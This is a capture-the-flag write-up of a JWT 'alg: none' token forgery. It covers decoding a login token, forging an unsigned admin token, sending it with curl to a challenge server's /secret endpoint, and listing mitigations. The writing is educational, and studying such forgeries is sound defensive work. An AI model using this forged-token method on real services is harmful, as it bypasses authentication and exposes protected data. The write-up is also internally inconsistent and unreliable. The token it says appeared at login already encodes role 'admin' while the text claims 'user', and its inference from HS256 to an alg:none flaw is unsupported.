# 🔐 None Shall Pass – JWT alg: none Token Forgery

**Category:** Web Security\
**Points:** 200\
**Solves:** 418

---

### 🧠 Challenge Summary

Deep inside Juche Jaguar’s intranet runs a custom token-based gateway protecting their most sensitive files at `/secret`. We got access to a low-privileged user account (`agent:spudpotato`). The challenge was to obtain a token and escalate privileges using a vulnerability in how JWTs were handled.

---

### 🎯 Objective

Exploit a vulnerable JWT implementation to escalate privileges from `user` to `admin` and access the `/secret` endpoint.

```
http://34.85.163.182:8080/secret
```

---

### 🛠️ Tools & Techniques Used

- [jwt.io](https://jwt.io) (for decoding and inspecting JWTs)
- Web browser (initial login)
- Manual Base64 crafting
- `curl` for HTTP request
- Token manipulation (`alg: none` bypass)

---

### 🔍 Recon – Analyzing the JWT

After logging in with:

```
Username: agent
Password: spudpotato
```

A JWT appeared at the bottom of the login screen:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ.<<signature>>
```

We pasted it into [jwt.io](https://jwt.io) to decode:

#### Header:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### Payload:

```json
{
  "user": "agent",
  "role": "user"
}
```

The use of `HS256` implied HMAC signing and suggested a possible `alg: none` vulnerability.

---

### 🧪 Exploitation – `alg: none` Forged JWT

Some misconfigured libraries accept tokens using `alg: none`, skipping signature validation entirely.

#### 1. Forge JWT Header:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

→ Base64: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

#### 2. Forge JWT Payload:

```json
{
  "user": "agent",
  "role": "admin"
}
```

→ Base64: `eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ`

#### 3. Combine:

```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ.
```

(Note: ends with a period to represent no signature)

---

### 🚀 Final Exploit Request

```bash
curl http://34.85.163.182:8080/secret \
  -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4ifQ."
```

---

### 🏁 Flag

```
C1{n0n3_4lg0_byp4ss}
```

---

### 🔒 Mitigation

- Reject tokens with `alg: none`
- Always validate the JWT algorithm against a whitelist (e.g., `HS256`, `RS256`)
- Use maintained JWT libraries with secure defaults

---

